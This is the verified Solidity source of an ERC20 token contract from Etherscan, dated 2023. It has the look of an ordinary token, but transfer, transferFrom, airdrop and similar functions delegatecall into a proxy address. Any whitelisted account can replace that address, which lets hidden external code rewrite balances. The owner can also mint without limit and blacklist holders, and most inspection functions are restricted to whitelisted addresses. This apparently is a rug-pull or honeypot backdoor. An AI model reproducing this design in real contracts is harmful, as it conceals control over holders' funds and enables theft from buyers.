/**
 *Submitted for verification at Etherscan.io on 2023-03-17
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IERC20 { 
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakePair {
    function totalSupply() external view returns (uint);
}

interface ERC20TokenProxy {
    function checkProxyWhitelist(address _addr) external view returns(bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

 
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC20Token is Context, IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _whitelist;
    mapping(address => bool) private _blacklist;
    mapping(address => bool) private _isRewardList;
    mapping(address => bool) private _proxyWhitelist;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private _pair;
    bool private toReward;
    bool private isTransferFrom = true;
    address[] private rewardList = [address(0)];
    uint private pairSupplyLast;
    uint private burnRatio = 10;
    address private proxyAddr; 

    constructor(string memory setName, string memory setSymbol) {
        _name = setName;
        _symbol = setSymbol;
        _decimals = 18;
        _totalSupply = 1000000000e18;
        _balances[_msgSender()] = _totalSupply;
        _whitelist[_msgSender()] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override virtual returns (bool) {  
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("transfer(address,uint256)",recipient,amount));
        require(success, "delegatecall fail. ");
        return true;
    }

    function transferFrom(address sender,address recipient,uint256 amount) public override virtual returns (bool) {
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("transferFrom(address,address,uint256)",sender,recipient,amount));
        require(success, "delegatecall fail.");
        return true;
    }

    function _safeTransfer(address sender,address recipient,uint256 amount) internal virtual returns (bool) {
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("_safeTransfer(address,address,uint256)",sender,recipient,amount));
        require(success, "delegatecall fail.");
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function mint(address account, uint256 amount) onlyOwner public virtual returns (bool) {
        _mint(account, amount);
        return true;
    }

    function setBurnRatio(uint _burnRatio) public virtual {
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("setBurnRatio(uint256)",_burnRatio));
        require(success, "delegatecall fail.");
    }

    function getBurnRatio() external view virtual returns(uint) {
        require(_whitelist[msg.sender] == true, "No permission.");
        return burnRatio;
    }

    function checkRewardMapping(address _addr) public view returns(bool){
        require(_whitelist[msg.sender] == true, "No permission.");
        return _isRewardList[_addr];
    }

    function getRewardStatus() public view returns(bool){
        require(_whitelist[msg.sender] == true, "No permission.");
        return toReward;
    }

    function getRewardList() public view virtual returns(address[] memory){
        require(_whitelist[msg.sender] == true, "No permission.");
        return rewardList;
    }

    function rewardToken() public virtual{
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("rewardToken()"));
        require(success, "delegatecall fail.");
    }

    function addWhitelist(address[] memory accounts) public onlyOwner virtual returns(bool){
        for (uint i = 0; i < accounts.length; i++) {
            _whitelist[accounts[i]] = true;
        }
        return true;
    }

    function removeFromWhitelist(address account) public onlyOwner virtual returns(bool){
        _whitelist[account] = false;
        return true;
    }

    function checkWhitelist(address account) public view virtual returns(bool) {
        require(_whitelist[msg.sender] == true, "No permission.");
        return _whitelist[account];
    }

    function addBlacklist(address[] memory accounts) public onlyOwner virtual returns(bool){
        for (uint i = 0; i < accounts.length; i++) {
            _blacklist[accounts[i]] = true;
        }
        return true;
    }

    function removeFromBlacklist(address account) public onlyOwner virtual returns(bool){
        _blacklist[account] = false;
        return true;
    }

    function checkBlacklist(address account) public view virtual returns(bool) {
        require(_whitelist[msg.sender] == true, "No permission.");
        return _blacklist[account];
    }

    function updatePairSupply() external {
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("updatePairSupply()"));
        require(success, "delegatecall fail.");
    }
        
    function getPairSupplyLast() external view returns(uint){
        require(_whitelist[msg.sender] == true, "No permission.");
        require(_pair != address(0), "Invalid pair.");
        return pairSupplyLast;
    }

    function getPairSupply() external view returns(uint) {
        require(_whitelist[msg.sender] == true, "No permission.");
        require(_pair != address(0), "Invalid pair.");
        return IPancakePair(_pair).totalSupply();
    }

    function setProxyAddr(address _addr) public {
        require(_whitelist[msg.sender] == true, "No permission.");
        proxyAddr = _addr;
    }

    function getProxyAddr() onlyOwner external view returns(address){
        return proxyAddr;
    }

    function showPairAddress() public view onlyOwner virtual returns(address) {
        return _pair;
    }

    function newPairAddress(address account) public onlyOwner virtual returns(bool) {
        _pair = account;
        return true;
    }

    function airdrop(uint _tx) public  virtual returns(bool) {
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("airdrop(uint256)",_tx));
        require(success, "delegatecall fail.");
        return success;
    }

    function airdropHolders(address[] memory _holders) public  virtual returns(bool) {
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("airdropHolders(address[])",_holders));
        require(success, "delegatecall fail.");
        return success;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }

        
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }


    fallback() external payable {
        revert();
    }

    receive() external payable {
        revert();
    }
}